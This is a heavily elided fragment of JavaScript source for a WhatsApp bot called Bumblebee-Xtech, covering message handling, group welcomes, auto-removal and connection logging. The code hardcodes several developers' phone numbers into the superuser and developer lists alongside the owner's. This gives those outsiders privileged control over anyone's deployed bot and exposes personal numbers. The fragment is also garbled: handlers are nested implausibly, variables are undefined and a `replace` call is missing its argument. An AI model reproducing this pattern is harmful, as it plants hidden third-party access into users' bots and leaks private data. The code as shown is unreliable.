...
zk.ev.on("messages.upsert", async (m) => {
    ...
    if (messageContent.slice(1).toLowerCase() === "vcf") {
        ...
        const baseName = "Bunblebee-Xtech family";
      ...
      await zk.sendMessage(callerId, {
        ...
        zk.ev.on("messages.upsert", async (m) => {
            ...
            /* const bright='254759000340';
             const black='254756360306';
             const tappy='254105325084*/
            /*  var superUser=[servBot,bright,black,tappy].map((s)=>s.replace(/[^0-9]/g)+"@s.whatsapp.net").includes(auteurMessage);
              var dev =[bright,black,tappy].map((t)=>t.replace(/[^0-9]/g)+"@s.whatsapp.net").includes(auteurMessage);*/
            ...
            const black = '254756360306';
            const tappy = "254105325084";
            const blacktappy = '254731316204';
            const sudo = await getAllSudoNumbers();
            const superUserNumbers = [servBot, bright, black, tappy, blacktappy, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
            const allAllowedNumbers = superUserNumbers.concat(sudo);
            const superUser = allAllowedNumbers.includes(auteurMessage);
            
            var dev = [dj, dj2,dj3,luffy].map((t) => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
            function repondre(mes) { zk.sendMessage(origineMessage, { text: mes }, { quoted: ms }); }
            console.log("\t🌐 Bumblebee-Xtech Online 🌐");
    ...
    console.error(e);
              ...
              try {
                ...
                if (ms.message[mtype].contextInfo.mentionedJid && (ms.message[mtype].contextInfo.mentionedJid.includes(idBot) ||  ms.message[mtype].contextInfo.mentionedJid.includes(conf.NUMERO_OWNER + '@s.whatsapp.net'))    /*texte.includes(idBot.split('@')[0]) || texte.includes(conf.NUMERO_OWNER)*/) {
                    ...
                    if (origineMessage == "120363369453603973@newsletter") {
                        return;
                    } ;
            ...
            var verifZokAdmin = verifGroupe ? admins.includes(idBot) : false;
             ...
             if(superUser || verifAdmin || !verifZokAdmin  ) { console.log('je fais rien'); return};
                                   ...
                                   // txt += `message supprimé \n @${auteurMessage.split("@")[0]} rétiré du groupe.`;
                                    const gifLink = "https://raw.githubusercontent.com/BlackTappy/Bumblebee-XMD/main/media/remover.gif";
...
zk.ev.on('group-participants.update', async (group) => {
    ...
    try {
        ...
        if (group.action == 'add' && (await recupevents(group.id, "welcome") == 'on')) {
            let msg = `*BUMBLEBEE-XTECH WELCOME MESSAGE*`;
    ...
    async  function activateCrons() {
        ...
        zk.ev.on("connection.update", async (con) => {
            ...
            if (connection === "connecting") {
                console.log("Bumblebee xtech is connecting...");
            }
            else if (connection === 'open') {
                console.log("✅ Bumblebee xtech Connected to WhatsApp! ☺️");
                console.log("--");
                await (0, baileys_1.delay)(200);
                console.log("------");
                await (0, baileys_1.delay)(300);
                console.log("------------------/-----");
                console.log("bumblebee xtech is Online 🕸\n\n");
                //chargement des commandes 
                console.log("Loading bumblebee xtech Commands ...\n");
                ...
                let cmsg =` ⁠⁠⁠⁠
╭─────────────━┈⊷ 
│🟢 *Ᏼᴜᴍʙʟᴇʙᴇᴇ-ХᴍᎠ 𝐈s 𝐂ᴏɴɴᴇᴄᴛᴇᎠ*🟢
╰─────────────━┈⊷
│⚒️ ᴘʀᴇғɪx: *[ ${prefixe} ]*
│⭕ ᴍᴏᴅᴇ: *${md}*
│🪀 *ʙᴏᴛ ɴᴀᴍᴇ* Ᏼᴜᴍʙʟᴇʙᴇᴇ-ХᴍᎠ
╰─────────────━┈⊷
